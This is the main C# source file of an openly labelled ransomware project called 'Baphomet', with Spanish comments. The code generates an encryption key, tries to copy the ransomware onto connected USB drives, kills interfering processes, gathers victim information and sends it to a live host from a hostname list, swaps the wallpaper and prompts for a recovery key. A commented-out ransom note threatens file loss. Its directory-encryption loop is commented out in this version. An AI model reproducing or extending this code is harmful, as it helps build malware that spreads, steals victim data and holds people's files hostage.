using Baphomet.Models;
using Baphomet.Utilities;
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program 
    {
        static void Main()
        {
            Cryptep cryptep = new Cryptep();
            Decrypt decrypt = new Decrypt();
            BackgroundPhoto photo = new BackgroundPhoto();
            NetInfo netInfo = new NetInfo();
            Diagnostics diag = new Diagnostics();

            var key = cryptep.GenerateKey();
            var userName = Environment.UserName;

            //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
            var Dirs = new[] { "\\Downloads" };
            var  userDir = "C:\\Users\\" +userName;

            var devicesLst = diag.GetUsbDevices();//Obtengo una lista de los usb conectados a la maquina.
            if(devicesLst.Count != 0)
                diag.AutoCopy(devicesLst);//Intento copiar mi ransomware en los usb.
           
            //Verifico y mato los procesos que puedan interferir con el cifrado de archivos. 
            diag.CheckProccess();
            //for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            //{
            //    var targetPath = userDir + Dirs[d];
            //    cryptep.directoryRoad(targetPath, key);
            //}

            //Verifico si tengo conecxion a internet.
            var internetCheck = netInfo.CheckInternetConnection();
            if(internetCheck != false)
            {
                //Obtengo la data de la victima una vez cifre todos los directorios.
                var victimInfo = netInfo.GetVictimInfo();
                var host = netInfo.HostName();//busco un host vivo en mi lista de hostnames.
                if (host != "noLive")
                    netInfo.SendData(victimInfo, host);
            }
            //Cambio el wallpaper Desktop
            var wallpaper = photo.imageBase64();
            photo.ChangeWallpaper(wallpaper,userDir);

            //Muestro el mensaje de alerta y espero el password de recuperacion.
            string password = Message();

            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var decryp_targetPath = userDir + Dirs[d];
                decrypt.directoryRoad(decryp_targetPath, password);
            }

        }//</main>

        //Console message.
        static string Message()
        {
            Console.BackgroundColor = ConsoleColor.DarkRed;
            // Console.SetWindowSize(1024, 768);
            //Console.WriteLine("  Uppps, I think I have the soul of your documents kidnapped");
            //Console.WriteLine("-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
            //Console.WriteLine(" If you are seeing this message, it is possible that many of your important documents are encrypted.\n In order to recover your files back you must follow the instructions step by step.");
            //Console.WriteLine(" Do not attempt to change the extension of the encrypted file, otherwise you will lose the file. Do not turn off or restart your computer and do not try random keys (You only have 3 attempts, otherwise you will lose your files).\n");
            //Console.WriteLine("");
            Console.WriteLine("Enter your key here:");
            string password = Console.ReadLine();
            return password;
        }//</message>

    }
}
